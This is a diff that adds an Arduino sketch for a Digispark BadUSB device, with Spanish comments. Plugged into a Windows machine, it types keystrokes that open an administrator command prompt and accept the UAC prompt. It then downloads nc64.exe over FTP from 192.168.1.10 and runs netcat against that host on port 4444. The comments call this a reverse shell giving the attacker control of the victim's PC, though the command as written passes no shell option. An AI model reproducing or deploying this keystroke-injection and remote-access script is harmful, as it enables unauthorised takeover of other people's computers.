@@ -1,0 +1,77 @@
+#define kbd_es_es;
+#include "DigiKeyboard.h"
+/* Init function */
+//script created by valkyrix.github.io
+void setup()
+{//turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
+  pinMode(1, OUTPUT); //LED on Model A
+  digitalWrite(1, HIGH);
+  DigiKeyboard.delay(1500);
+  digitalWrite(1, LOW);
+  DigiKeyboard.sendKeyStroke(0);
+  // primero abriremos el buscado de windows con la tecla de windows
+  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
+  DigiKeyboard.delay(1500);
+  //entraremos  al cmd escribiendo cada letra pulsada
+  DigiKeyboard.sendKeyStroke(KEY_C);
+   DigiKeyboard.delay(1500);
+  DigiKeyboard.sendKeyStroke(KEY_M);
+   DigiKeyboard.delay(1500);
+  DigiKeyboard.sendKeyStroke(KEY_D);
+ // DigiKeyboard.println("cmd");
+  DigiKeyboard.delay(1800);
+  //Le daremos permisos de administrador
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(3800);
+  //nos pedirá confirmacion con "si" por esto es necesario usar la flecha de la izquierda
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(3800);
+  //y confirmamos conn enter
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(3000);
+  //DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
+  //DigiKeyboard.delay(1800);
+  //DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
+  //DigiKeyboard.delay(1800);
+  //DigiKeyboard.sendKeyStroke(KEY_TAB,MOD_ALT_LEFT);
+  //DigiKeyboard.delay(1800);
+  //a partir de aqui primero nos iremos a la ruta donde queremos posteriormente descargar netcat
+  DigiKeyboard.println("cd /");
+ // DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.println("cd Users/prueba/Desktop");
+ // DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+  //nos conectamos al ftp introducimos user y clave (la misma en este caso) y accedemos a la ruta donde tenemos el netcat y lo descargamos con un get (se descargará en la ruta puesta previamente)
+  DigiKeyboard.println("ftp");
+ // DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.println("open 192.168.1.10");
+ // DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.println("user");
+ // DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.println("user");
+ // DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.println("cd Users/IEUser/Documents/ftp");
+//  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.println("get nc64.exe");
+ // DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+  //cerramos el ftp
+  DigiKeyboard.println("bye");
+ // DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.println("dir");
+//  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+  //nos conectamos al equipo atacante con una reverse shell y ya controlaremos desde el atacante el pc de la victima
+  DigiKeyboard.println("nc64.exe -nv 192.168.1.10 4444");
+//  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(13000);
+  
+  
+  digitalWrite(1, HIGH);
